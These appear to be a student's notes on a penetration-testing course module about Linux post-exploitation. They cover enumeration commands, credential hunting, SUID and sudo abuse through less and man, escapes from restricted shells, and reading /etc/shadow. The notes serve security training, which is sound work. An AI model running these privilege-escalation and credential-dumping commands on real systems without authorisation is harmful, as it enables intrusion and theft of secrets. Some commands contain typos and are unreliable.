# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
___________________________________
# Linux Exploitation
# Module 4 - Post Exploitation

https://cdn.members.elearnsecurity.com/ptp_v5/section_4/module_4/html/index.html

###### Module Map
1. Privilege Escalation
2. Lateral Movement
3. Data Exfiltration
4. Maintaining Access
___________________________________
At this stage, you have conducted your initial enumeration, have been able to use the acquired information to obtain access to several machines, and now it is time to move into the post-exploitation phase.

It is in this phase of testing where we:
- Perform additional information gathering and enumeration of any systems from a local perspective (shell, console, etc.)
- Elevate our privileges
- Maintain a foothold
- Pivot to other systems and
- Utilize methods to exfiltrate data

Our first task is to gather additional information about the system, including users, permissions, installed applications, how software is configured, and other things  about the system which will help us in our quest for root.

As we have learned from the Information Gathering (Local Enumeration) module of this lesson, there are many commands and things we can do once we have gotten access to a Linux machine.

We will review some of those methods in greater depth for this module.

The process for post-exploitation can be broken down into several distinct categories, which can be further broken down into sub-categories.
- Additional Information Gathering
- Privilege Escalation
- Lateral Movement
- Data Exfiltration
- Maintaining Access

___________________________________
## 4.1. Privilege Escalation
In regards to gathering information related to Privilege Escalation, once access to a host has been obtained there are several sub-categories we can use to distinguish the different types of information we will gather.

This information can be generally divided as follows:
- System and Network Information
- User Information
- Privileged Access / Cleartext Credentials
- Services
- Job/Tasks
- Installed Software Version Information

#### 4.1.1. System and Network Information
  - Hostname
    - Does the hostname reveal anything about the systems' function? <br>
    Can we leverage that information to gain access to function-related information?
    - Related Command : `hostname`
  - Kernel Version
    - Is the kernel vulnerable to any exploits?
    - Related Command: `uname -a`
  - Operating System
    - Does our current OS have any known exploitable vulnerabilities?
    - Related Command: `cat /etc/issue`
  - IP address
    - Related Command: `ifconfig`
  - Running Processes
    - Related Command: `ps auxw`
  - Network Routes
    - Is our currently compromised machine routed to other networks?<br>
      Can we use this information to pivot?
    - Related Command: `route -n`
  - DNS server
    - Can we obtain information from the DNS server? <br>
      Active Directory Accounts, Zone Transfers, etc.
    - Related Command: `cat /etc/resolv.conf`
  - ARP Cache
    - Have other machines communicated with another target? <br>
      Are the other machines accessible from the target?
    - Related Command: `arp -a`
  - Current Network Connections
    - Are there any established connections from our machine to other machines and vice versa? <br>
      Are the connections over encrypted or non-encrypted channels? <br>
      Can we sniff the traffic of those connections?
    - Related Command: `netstat -auntp`
#### 4.1.2. User Information
  - Current User Permissions
    - Can our current user access sensitive information/configuration details that belong to other users?
    - Related Command: `find / -user username`
  - UID and GID Information for All Users
    - How many users on the system? <br>
      What groups do users belong to? <br>
      Can we modify files belonging to users in other groups?
    - Related Command:
    `for user in $(cat /etc/passwd) | cut -f1 -d":"; do id $user; done`
  - Last Logged on Users
    - Who has been on the system? <br>
      From what systems? <br>
      Can we pivot to those other systems using credentials we might already have?
    - Related Command: `last -a`
  - Root Accounts
    - How many UID 0 (root) accounts are on the system? <br>
      Can we get credentials for any of them?
    - Related Command:
    `cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'`
  - Service Accounts
    - Do any of the service accounts (i.e., www-data) have shells defined? <br>
      Can we log in as those accounts?
    - Related Command: `cat /etc/passwd`
  - Home Directories
    - Do we have access to other users' home directories? <br>
      Is any of the information contained in those directories useful to use?
    - Related Command: `ls -als /home/*`
#### 4.1.3. Privileged Access / Cleartext Credentials
  - Can the current user execute anything with elevated privileges?
    - Related Command: `sudo -l`
  - Are there any setuid root (SUID) ninaries on the system which may be vulnerable to privilege escalation?
    - Related Command: `find / -perm -4000 -type f 2>/dev/null`
  - Can we read configuration files that might contain sensitive information, passwords, etc.?
    - Related Command: `grep "password" /etc/*.conf 2>/dev/null`
  - Can we read the shadow file? If so, can we crack any of the hashes?
    - Related Command: `cat /etc/shadow`
  - Can we list or read the contents of the `/root` directory?
    - Related Command: `ls -als /root`
  - Can we read other users' history files?
    - Related Command: `find /* -name *.history* -print 2>/dev/null`
  - Can we write to directories that are configured to serve web pages?
    - Related Command: `touch /var/www/file`
#### 4.1.4. Services
  - Which service are configured on the system and what ports are they opening?
    - Related Command: `netstat -auntp`
  - Are service configuration files readable or modifiable by our current user?
    - Related Command: `find /etc/init.d ! -uid 0 -type f 2>/dev/null | xargs ls -la`
  - Can we modify the configuration of a service in such a way that gives us elevated privileges?
  - Do the configuration files contain any information we can use to our advantage? (i.e. credentials, etc)
    - Related Command: `cat /etc/mysql/my.cnf`
  - Can we stop or start the service as our current user?
    - Related Command: `service service_name start/stop`
  - What actions take place as a result of being able to stop and start service?

#### 4.1.5. Job/Tasks
  - What tasks or job is the systems configured to run and at which times?
    - Related Command: `cat /etc/crontab`
    - Related Command: `ls -als /etc/cron.*`
  - Are there any custom jobs or tasks configured as root that world-writeable?
    - Related Command: `find /etc/cron* -type f -perm -o+w -exec ls -l {} \;`
  - Can we modify any of the existing tasks at all?
    - Related Command: Try and modify cron jobs

#### 4.1.6. Installed Software Version Information
  - What software packages are installed on the system?
    - Related Command: `dpkg -l`
  - What versions? Are the versions installed out-of-date and vulnerable to existing available exploits?
    - Related Command: `dpkg -l`
    - Related Command: `searchsploit "httpd 2.2"`
  - Does any of the installed software allow us to modify their configuration files and could this result in gaining privileged access to the system?
    - Related Command: Try and modify package configurations

Much of the information previous information (and more) can be gathered either manually or through the use of automated tools, which is a bit more time efficient when on an engagement.

#### LineEnum and NetCat
One particular tool of note is [LinEnum](https://github.com/rebootuser/LinEnum)
  LinEnum will automate much of the information gathering and enumeration phase for us, and there are also a great number of resources available  to use as a interface for commands regarding the information gathering and enumeration process as it related to post-exploitation.
  Below are just a couple great resources we can use to help with this process:
  - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
  - https://www.rebootuser.com/?p=1623

  In order to utilize LinEnum once on a system, we will need to download it onto the target.

  Now assuming `wget` is installed on our target, we can use that to download the shell script directly from Github:
    ```
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/msater/LinEnum.sh
    ```

In case you are unable to download LinEnum onto the target host, (perhaps wget is not on the system, or your connectivity to the internet is restricted) you can simply copy and paste the contents of the script into a new file on the system.

Or, you can use netcat if available on the target to transfer the file from your attacker system to the target:

  On Target Machine:
  ```
  nc -l -p 1234 > LinEnum.sh
  ```
  On Attacker Machine:
  ```
  nc -w 3 <target_ip> 1234 < LinEnum.sh
  ```

  The above netcat file transfer method sets up a listener on the target to redirect incoming data (>) to a new file, while on the Attacker machine, we connect to our target system while redirecting the contents of LinEnum.sh to the target.

  An important note about transferring files via netcat is that all traffic is unencrypted and may be detected by Intrusion Detection Systems or other anomalous traffic detection mechanisms implemented within an organization.

  It is a quick, easy way to get files from one system to another, but not stealthy in any way. We will cover alternative methods of transferring files and exfiltrating data over encrypted channels later in this module.

#### 4.1.1. Cleartext Credentials in Configuration Files
- `LinEnum`
Once we have downloaded the shell script or copied LinEnum to our target system, make sure that we set the executable bit with:
  ```
  chmod +x LinEnum.sh
  ```

Running Linenum with the `-h` switch shows us some of the options available with this tool:
  ```
  todd@server2:~# ./LinEnum.sh -h
  ./LinEnum.sh: option requires an argument -- h

  #########################################################
  # Local Linux Enumeration & privilege Escalation Script #
  #########################################################
  # www.rebootuser.com | @rebootuser
  # version 0.7

  # Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t

  OPTIONS:
  -k      Enter keyword
  -e      Enter export location
  -t      Include thorough (lengthy) tests
  -r      Enter report name
  -h      Displays this help text
  ```
  Using the `-k` (keyword) option, **we can have LinEnum search configuration files for a string**, such as `password`. This can often reveal credentials for other services which we can use for further exploitation.

- `grep`, `find`, `cat` (information got not identical to above)
Alternatively, we can get similar results manually by using the `grep` command like so:
  ```
  grep -r password /etc/*.conf 2> /dev/null
  ```

  The above grep command will **search** the `/etc` directory recursively (`-r`) for all `.conf` files containing the string `password` while sending errors to `/dev/null`.
  Experiment with the above grep command and look for other interesting string in other file types that could be used to potentially gain elevated privileges.

As we mentioned, there are a number of additional useful one-liners and commands we can use to help us gather information from Linux systems.
If successful, they can help us get root access or other types of access, as seen with the command below, but also make sure to reference the supplied Post Exploitation Command Sheet provided with this module for more.
  Find dotfiles with **history** in their names (i.e., `.bash_history`)
    ```
    find /* -name *.*history* -print 2> /dev/null
    ```
  Grep the apache access.log file for **user** and **pass** strings
    ```
    cat /var/log/apache/access.log | grep -E "^user|^pass"
    ```
  Dump cleartext Pre-Shred Wireless Keys from Network Manager
    ```
    cat /etc/NetworkManager/system-connections/* | grep -E "^id|^psk"
    ```

  **Consider the following scenario:**
    An administrator has configured a web server which uses a MySQL backend database.

    You have exploited the web server through a vulnerable PHP page, and now have access to the system as a restricted `www-data` user and can execute system commands as that user.

    We have also determined through listing running processes on the system that the MySQL daemon is running as root.

    This is a perfect opportunity to use our access as the `www-data` user to search for any PHP files or MySQL configuration files which might contain credentials to the database.

    **Those credentials, if found, can then be used to obtain access to the MySQL database, and depending on its configuration, can give us the ability to execute system commands as root**, such as is possible with [Command Execution via User-Defined Functions](https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html) (UDF)

- MSF Modules
In addition to using LinEnum and manual commands to gather information from a system locally, another method we can use to download configuration files from the target system (assuming you already have a shell on the system via a Metasploit session), is to use Metasploit's `enum_configs` post module, which can be loaded with:
  ```
  msf> use post/linux/gather/enum_configs
  msf post(linux/gather/enum_configs)> set SESSION 1
  msf post(linux/gather/enum_configs)> run
  ```

  Once you configure your `SESSION` value and `run` the module, it will download the most common configuration files into your `~/.msf4/loot/` directory.

Another Metasploit post module for Linux you will find useful is the `enum_system` module.
  `enum_system` will gather Linux versions, User accounts, Installed Packages, Cron jobs, and more from an existing Metasploit shell session.

Lastly, there are also several other Metasploit post modules we can use for post-exploitation of a Linux system. Experiment with these modules to see how they can help you further exploit a Linux.
  Lists all modules on `post/linux`
  ```
  msf > use post/linux
  ```

#### 4.1.2. SUID Binaries
[SUID](https://en.wikipedia.org/wiki/Setuid) or *setuid* executables are a blessing in disguise when it comes to privilege escalation opportunities. Executable files with the *setuid* atrribute assigned, when executed, are run as the owner ([EUID](https://en.wikipedia.org/wiki/User_identifier#Effective_user_ID) or Effective User ID) of the file regardless of the current users' privileges.

Below, we can see root is the owner of the `/bin/ping` binary, and it is also configured with the `setuid` attribute.
  ```
  root@server2:~# ls -als /bin/ping
  60 -rwsr-xr-x 1 root root 61240 Nov 10 2016 /bin/ping
  root@server2:~#
  ```

  The reason that `ping` is configured as a SUID root binary, is that `ping`, by its very nature uses [raw sockets](https://en.wikipedia.org/wiki/Network_socket#Raw_socket) to generate and receive ICMP packets and that activity requires root access.

  The `passwd` executable, responsible for enabling users to change their passwords, is also SUID root, due to the fact that it needs to write to the `/etc/passwd` and `/etc/shadow` files.

There are several other well-known SUID root binaries, as they all require some sort of elevated permissions to perform a function, and some of the most common you will find on Linux systems are:
  ```
  /bin/su
  /bin/mount
  /usr/bin/sudo
  /usr/bin/passwd
  /usr/bin/chsh
  ```

**Finding SUID Binaries**
  We can use the following `find` command to search for all SUID executable files on a Linux system:
    ```
    find / -perm -4000 -type f 2>/dev/null
    ```

    The above command is executing `find` on the root directory (`/`), looking for regular executable files (`-type f`) with the `setuid` permission (`-perm -4000`) set, and sending all errors (`2`) to `/dev/null`

So we know that SUID root binaries are executed as root regardless of our current users' permission.
That is great, but how do we exploit that to get a root shell?

  The issue arises when we find a SUID root executable that takes some form of user input that is not properly checked or sanitized, which could result in a buffer overflow within that binary, resulting in our code (input) being executed as root.

  Another scenario could simply be a SUID root binary that just takes an argument as a command to execute, or takes an argument as a file to read, etc.

**SUID Modcat Example**
  Let's take a look at the following C code of a file we will call *modcat* (essentially a wrapper for the cat command), as an example:
    ```
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>

    int main(int argc, char ** argv){
      if (argc<2){
        print("Reads a file. No file name provided.\n");
      } else{
        execv("/bin/cat", argv);
        perror("exec");
      }
    }
    ```
    The above code, when compiled, simply takes a single argument (`argv`) (a file in this case) and executes (`execv`'s) the `/bin/cat` command on it.

    In other words, after the code is compiled, a typical command line for our *modcat* would look something like:
      ```
      $ modcat /etc/passwd
      ```
    Which would simply print (`cat`) the contents of the `/etc/paswd` file:
      ```
      root@server2:~# modcat /etc/passwd
      root:x:0:0:root:/root:/bin/bash
      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
      bin:x:2:2:bin:/bin:/usr/sbin/nologin
      ```

    That is great, as any user should be able to read the `/etc/passwd` file naturally, and we can see the executable works as expected. It prints out the contents of a file supplied as an argument.

  Now consider that an administrator has given the same executable the SUID attribute, and is owned by root:
    ```
    bob@server2:~$ ls -als /usr/local/bin/modcat
    12 -rwsr-xr-x 1 root staff 8520 Jan 12 12:22 /usr/local/bin/modcat
    ```

  Of course, now we can execute `modcat` to display the contents of `/etc/shadow` (a file only root should be able to read), since the binary will run as root due to the *setuid* bit being set, and it being owned by root:
    ```
    bob@server2:~$ modcat /etc/shadow
    root:$6&EN3zSSU/$cSFDGdrNFskJyKmUCSit3fRlxvcMOnTCFqhWwPU/M.5x
    MXUtE6qWTJyrmQk/:17518:0:99999:7:::
    daemon:*:17479:0:99999:7::::
    bin:*:17479:0:99999:7::::
    sys:*:17479:0:99999:7::::
    sync:*:17479:0:99999:7::::
    games:*:17479:0:99999:7::::
    ```

  The above `modcat` example can be trivially exploited to obtain root access to a system.
    How that can be accomplished exactly, is left as an exercise and can be found in the Lab.

**SUID Modcat Example**
  Another example of a setuid binary sometimes found on Linux systems is Nmap.
  Older versions of Nmap contained an interactive *shell*, which could be launched via the `--interactive` switch.

  Once in interactive mode, and assuming the Nmap executable was SUID root, simply running `!sh` in the interactive nmap console would land the user a root shell.

**glibc '$ORIGIN' Expansion Privilege Escalation**
  An interesting example related to SUID executables discovered by Tavis Ormandy of Google's Project Zero, exploits the GNU C Library Dynamic Linker (Glibc) versions before 2.11.3 and 2.12.x versions up to 2.12.1 and takes advantage of glibc's failure to restrict the use of the LD_AUDIT environment variable when loading SUID executables which controls the [$ORIGIN library search path](https://enchildfone.wordpress.com/2010/03/23/a-description-of-rpath-origin-ld_library_path-and-portable-linux-binaries/)

  Ultimately resulting the execution of an arbitrary shard object (`.so` file).

  Although this vulnerability was [initially disclosed in 2010](http://seclists.org/fulldisclosure/2010/Oct/257), a Linux exploit module was [added to Metasploit](https://github.com/rapid7/metasploit-framework/commit/0ba37f8104a756531a8aa0476fc28752e376cd73#diff-bd65d6882264a406ab376d3abd0bce6e) January of 2018 and also provides a good example of other ways that privilege escalation can be obtained through the exploitation of environment variables, related to SUID executables.

  Read more about the specifics [here](http://seclists.org/fulldisclosure/2010/Oct/257)

  If you would like to experiment with this on a Linux system with a vulnerable version of glibc, you can load the Metasploit module with:
    ```
    msf > use exploit/linux/local/glibc_origin_expansion_priv_esc
    ```

#### 4.1.3. Sudo Privileges Access
`sudo` misconfigurations are another important finding as it relates to privilege escalation.

Sudo is used to provide privileges access to users on a temporary basis, allowing users to run commands as another user (usually as root), and when that elevated access is required, a user can simply run `sudo command`.

In order for a user to be able to utilize `sudo`, a change is required in the `/etc/sudoers` configuration file.

  The following is a snapshot of a typical `/etc/sudoers` file without any modifications:
    ```
    ...
    # User privilege specification
    root    ALL=(ALL:ALL) ALL
    # Allow members of group sudo to execute any command
    %sudo   ALL=(ALL:ALL) ALL
    ...
    ```
  After modifications for the user Bob:
    ```
    ...
    # User privilege specification
    root    ALL=(ALL:ALL) ALL
    bob     ALL=(root) NOPASSWD: /bin/less /var/log/*
    bob     ALL=(root) NOPASSWD: /usr/bin/man
    # Allow members of group sudo to execute any command
    %sudo   ALL=(ALL:ALL) ALL
    ...
    ```

Please note that a standard user will typically not be able to view the `/etc/sudoers` file directly. However, we can retrieve our sudoers status once we are on a system with `sudo -l` command:
  ```
  bob@server2:~$ sudo -l
  Matching Defaults entries for bob on server2:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  User bob may run the following commands on sever2:
      (root)  NOPASSWD: /bin/less /var/log/*
      (root)  NOPASSWD: /usr/bin/man
  bob@server2:~$
  ```

  From the output from the previous slide, we can see that `bob` can `sudo` and `less` on any files in the `/var/log/` directory, in addition of being able to sudo the `man` command.

  We can also see that the commands defined for `bob` will be run as `root`, and furthermore, won't require `bob` to enter a password for either of those commands as well, as we can see the `NOPASSWD` directive specified.

At first glance, the above-allowed commands for `bob` may not seem like a big deal, but let's examine this a bit more and see how we could exploit those to get root-level access on the machine.
  Both `less` and `man` commands, among many others, if found in an `/etc/sudoers` file, can be exploited to get root.

**Shell Escape via Less**
  Let's first examine the `less` program itself.

  If we take a look at its `man` entry, we can see that as part of its functionality, it allows a user to execute shell commands (shell escape) with the `!` (shell-command):
    ```
    man less
    ```
    ```
    ...
    ! shell-command
      Invokes a shell to run shell-command given.
      ...
    ...
    ```

  This allows the user to execute shell commands from inside `less`.

  As an example, here is a regular user running the `less /var/log/Xorg.1.log` command, typing the `!id` shell-command:
    ```
    bob@server2:~$ less /var/log/Xorg.1.log
    ```
    ```
    ...
    !id
    ```
    ```
    bob@server2:~$ less /var/log/Xorg.1.log
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    !done (press RETURN)
    ```

  We can see from the above that we executed the `!id` command, from `less`, and it returned the current users' UID/GID information.

  We can see where this is going! (root ofc)

  If our user is in the `/etc/sudoers` file and can execute `less` on certain files (as root), in this case, any file in `/var/log/*`; `less` will effectively be executed as `root`.

  We can see what happens when we `sudo` the `less` program and execute `!sh` command to escape the shell, followed by the `id` command to check our UID/GID information.
    ```
    sudo less /var/log/Xorg.1.log
    ```
    ```
    ...
    !sh
    ```
    ```
    # id
    uid=0(root) gid=0(root) groups=0(root)
    #
    ```

  There are many examples of binaries on Linux that allow the user to execute shell commands, `less` being one of them.

  `vi`/`vim` editors also allows breaking out into a shell via the `!sh` method or executing any shell commands for that matter.

A list of some common executables, if they are present in the sudoers file, can give us root shells through different means.
The below commands (`!sh`) are sometimes referred to as "shell escapes" and are executed from withtin the executable themselves:
- less (`!sh`)
- more (`!sh`)
- vi/vim (`:!sh`)
- nmap (`--interactive` + `!sh`)
- ftp (`!sh`)
- gdb (`!sh`)
- python
- perl
- lrb
- lua

Aside from programs that allow shell commands to be executed with the `!` feature, many others also exist, that with some experimentation and exploration, also allow the execution of arbitrary shell scripts or commands when passed as arguments via the command line.

**"Man" Arbitrary Command Execution via Pager Argument**
  For instance, the `man` program, short for "manual", is essentially the command reference guide built into the Linux OS.

  We use `man` to view "man pages" when we need to reference a particular program. If we want the man page for the `id` program, we simply call `man id`

  The `man` program usually utilizes the `more` and `less` programs to display its pages depending on its configuration. The programs it uses for this purpose is known as `pager`, and can be specified with the `-P` switch when running `man`. If we look at the man page for `man` (`man man`), we can see what the `pager` option is about:
    ```
    Controlling formatted output
        -P pager, --pager=pager
              Specify which output pager to use. By default, man uses pager.
              This option overrides the $MANPAGER environment variable, which in turn overrides the $PAGER environment variable. It is not used in conjunction with -f or -k.  

              The value may be a simple command name or a command with arguments, and may use shell quoting (backslashed, single quotes, or double quotes). It may not use pipes to connect multiple commands; if you need that, use a wrapper script, which may take the file to display either as an argument or on standard output.
    ```

  Due to a quirk in the `man` program and how it handles the `pager` (`-P`) argument, we can run a commands that we want; for example, we will tell man to run the `id` command to display our UID and FID information:
    ```
    man -P "id" man
    ```
    ```
    bob@server2:~$ man -P "id" man
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    bob@server2:~$
    ```
    We can see that we were able to coerce `man` with the `-P` switch to launch our `id` command as the `pager` in this case.

  Now considering the previous example of the commands `bob` is allowed to execute via `sudo`, one of which was `man`. We can use that `pager` quirk to read the `/etc/shadow` file, or execute whatever we want as root (through `man`):
    ```
    sudo man -P "cat /etc/shadow" man
    ```
    ```
    bob@server2:~$ sudo man -P "cat /etc/shadow" man
    root:$6&EN3zSSU/$cSFDGdrNFskJyKmUCSit3fRlxvcMOnTCFqhWwPU/M.5x
    MXUtE6qWTJyrmQk/:17518:0:99999:7:::
    daemon:*:17479:0:99999:7::::
    bin:*:17479:0:99999:7::::
    sys:*:17479:0:99999:7::::
    sync:*:17479:0:99999:7::::
    games:*:17479:0:99999:7::::
    ```

**Docker Sudo Privilege Escalation**
  Although privilege escalation vectors related to Sudo have existed since the inception of the Linux OS, one of the more recent examples of a Sudo exploit requires that [Docker](https://en.wikipedia.org/wiki/Docker_(software)), a popular virtualization software that utilizes containers is installed on the target system and is also defined as an entry for a user in the `/etc/sudoers` file to be executed as root similar to how we have seen in the previous `sudoers` entries.

  This particular vulnerability exploits Docker by compiling shellcode for a root shell within a container, sets the SUID attribute on the exploit binary, and then launches a root shell.

  You can find more information about the Docker Sudo exploit [here](https://github.com/pyperanger/dockerevil)

#### 4.1.4. Restricted Shells
[Restricted shells](https://en.wikipedia.org/wiki/Chroot) are another topic we should become familiar with, as they are encountered in the field often in hardened environments where users require access to server, but the administrators would like to limit the commands that users on the system can execute.

You may be more familiar with the term [chroot jail](https://en.wikipedia.org/wiki/Chroot) when it comes to restricted shells.

A chrooted jail is a way to isolate users and users' processes from the rest of the OS.

All programs defined for a chroot jail are run in their own directory structure, with their own shared libraries and environment settings.

One of the more common implementations of restricted shells utilized `rbash` shell, which would be the shell defined for a user once logged on to a machine through pre-defined environment variables.

`rbash` when combined with chroot hail, can be rather effective; however, many times, administrators rely on rbash alone, which opens up several ways we can break out of the restricted shell.

When the `rbash` shell is defined for users, some commands that are usually restricted are:
- The ability to change into other directories (`cd`)
- Specifying absolute path names or files containing a (`/`) or (`-`)
- Setting or unsetting the PATH environment variable
- Using ENV or BASH_ENV for setting or unsetting other environment variables
- Using bash output redirection operators (`>`, `>>`, `>|`, `<>`, `>&`, `&>`)
- Disabling restricted mode using the `set +r` or `set +o restricted` commands

How to tell you are in a restricted shell
  You can usually tell you are in a restricted shell when you start seeing "restricted" errors when you attempt to execute usual commands like `cd`:
    ```
    $ cd
    rbash: cd: restricted
    ```

  Or when trying to redirect the output of a command to a file:
    ```
    $ id > id.txt
    rbash: id.txt: restricted: cannot redirect output
    ```

  One of the first things we can do to confirm we are in a restricted shell is to run the `ENV` command to get a better understanding of how your environment is configured and what your current shell is.

  Specifically, your `$PATH` and `$SHELL` environment variables:
    ```
    $ ENV
    ...snip...
    WINDOWPATH=2
    VTE_VERSION=5001
    SHELL=/bin/rbash
    TERM=xterm-256-color
    ...snip...
    XDG_RUNTIME_DIR=/run/user/0
    XAUTHORITY=/run/user/0/gdm/Xauthority
    PATH=/var/chroot/bin
    GJS_DEBUG_TOPICS=JS ERROR;JS LOG
    ```

    In this snapshot, we can see that our `SHELL` environment variable is set to `/bin/rbash` and our `$PATH` is also confined to the `/var/chroot/bin` directory.

  Combined with the `restricted` errors we are seeing, and an inability to run some typical shell commands, we can be sure we are in a restricted shell.

There are a great number of things we can try to break out of this restricted shell, and we will cover several methods, and leave others up to the imagination and creativity of the individual.
  We have previously covered several programs (`less`,`vim`,`nmap`,etc.) that offer the ability to escape into a shell with the `!` method.

  Those certainly can be used to attempt to get out of our restricted shell, assuming of course that your restricted shell allows you to run those binaries in the first place.

  **Restricted Shell Escape with Vi/Vim**
    An example restricted shell escape with the `vi` or `vim` editor would be to open a file, and then run `:!sh` and then `<enter>` inside `vi`:
      ```
      vi /tmp/test
      ```
      ```
      ~
      ~
      ~
      :!sh
      [No write since last change]
      sh-3.2$ _
      ```

      The results in getting us a regular `/bin/sh` shell outside of our restricted `rbash` shell as seen in the above example.

  **Restricted Shell Escape with Vi/Vim**
    Another trick we can use to break out of a restricted shell is with the `find` command coupled with the `-exec` argument:
      ```
      find /home/bob -name test -exec /bin/sh \;
      ```
      ```
      bob@server2:~$ find /home/bob -name test -exec /bin/sh \;
      $ id
      uid=1001(bob) gid=1001(bob) groups=1001(bob)
      $
      ```

      The above find commands is looking for a file named "test" (`-name test`) in the `/home/bob` directory, and if found, will execute whatever follows the (`-exec`) switch.

    Note: The above find trick will only work if the file "test" exists in the specified path (/home/bob). If it doesn't exist, search for a known file, or create a file if needed.

  **Restricted Shell Escape with Python or Perl**
    Although it may not be likely that you will be able to execute Python, Perl, IRB, etc, while in a restricted shell, but if you find that you can, we can use those to break out as well:
    - Python
      The below Python command spawns what is known as a pseudo-TTY and can also be very useful when an interactive TTY is needed after the result of an exploit, especially with Metasploit-based Linux reverse_tcp or bind_shell payloads
      ```
      bob@server2:~$ python -c 'import pty; pty.spawn("/bin/sh")'
      $ id
      uid=1001(bob) gid=1001(bob) groups=1001(bob)
      ```
    - Perl
      ```
      bob@server2:~$ perl -e 'exec "/bin/sh";'
      $ id
      uid=1001(bob) gid=1001(bob) groups=1001(bob)
      ```
  **Restricted Shell Escape with SSH**
    If we have SSH credentials to a system for a user that is configured with restricted shell, we can try and break out the shell remotely form another system by trying to execute a shell with SSH before the restricted shell is initialized on the target.
    ```
    ssh restricted_user@targetserver -t "/bin/sh"
    ```

  There are [many ways](https://www.google.com/search?q=%22Restricted+shell%22+++%22pentesting%22&oq=%22Restricted+shell%22+++%22pentesting%22) we can escape the restricted shell.

  Sometimes al it takes is some creativity, digging a little bit deeper, and making sure we are comprehensively enumerating our target.

#### 4.1.5. Cracking the Shadow
You have exploited a machine, have a Metasploit session, or a reverse shell on the system as `root`, through a web-based or other exploit, but don't have any valid credentials to try and move laterally to other systems re-using credentials from a user that exists on your currently exploited machine.

  Sometimes a shell is not enough, and we require credentials to further our objectives, move laterally from one machine to another, masquerade through a network using valid credentials, etc.

In the event we have a shell on a machine as root, there are several things we can do to obtain some basic credentials.
  One of those involves cracking the password hashes in the `/etc/shadow` file.

  The [/etc/passwd](https://en.wikipedia.org/wiki/Passwd) and [/etc/shadow](https://en.wikipedia.org/wiki/Passwd#Shadow_file) files are responsible for maintaining the database of users on a Linux system and are directly manipulated by the `/usr/bin/passwd` program among other programs whenever changes are made to any existing users or passwords.

Some Unix passwd History:
  Before the mid-80's, both username and passwords were stored in a single file, the `/etc/passwd` file.

  In an effort to better secure the file from dictionary and brute force attacks against the hashes by any user, developers introduced **shadowing** of the passwords via a separate file.

  The `/etc/shadow` file we know today is only readable by root and the SUID root `/etc/passwd` program.

  The `/etc/passwd` files stores general user information including current home directory, UID value, GID, login shell, and any descriptive information for a particular user, and can be read by any standard user.
    Snippet of several `/etc/passwd` entries:
    ```
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    ```

  Whereas the `/etc/shadow` file stores the users' passwords in a hashed format, in addition to other things such as password expiration information, whether the user is required to change their password on next logon, min/max time between password changes and several other parameters.
    The password hash is always the second field after the username.
    The fields are separated by colon (:).
    ```
    root:$6$EN3zSSU/$cSFDGdrNFskJyKmUCSit3fRlxvcMOnTCFqhWwPU/M.5x
    MXUtE6qWTJyrmQk/:17518:0:99999:7:::
    daemon:*:17479:0:99999:7::::
    bin:*:17479:0:99999:7::::
    sys:*:17479:0:99999:7::::
    sync:*:17479:0:99999:7::::
    games:*:17479:0:99999:7::::
    ```

    The `/etc/shadow` file can only be read by root, the `passwd` program along with several other programs that require the ability to modify the `/etc/passwd` and `/etc/shadow` files.

    In the current versions of Linux, the hashes in the shadow file are stored as [SHA-512](), and can be quickly recognized by the `$6$` at the beginning of the hash as seen in the following `/etc/shadow` entry:
      ```
      root:$6$EN3zSSUJacSFDGdrNFskJyKmUCSit3fRlxvcMOnTCFqhWwPUAq.5x
      MXUtE6qWTJyrmQk/:17518:0:99999:7:::
      ```
    Older versions may be using SHA-256 or MD5 which can be identified by `$5$` and `$1$` respectively.

___________________________________
## 4.2. Lateral Movement


___________________________________
## 4.3. Data Exfiltration


___________________________________
## 4.4. Maintaining Access
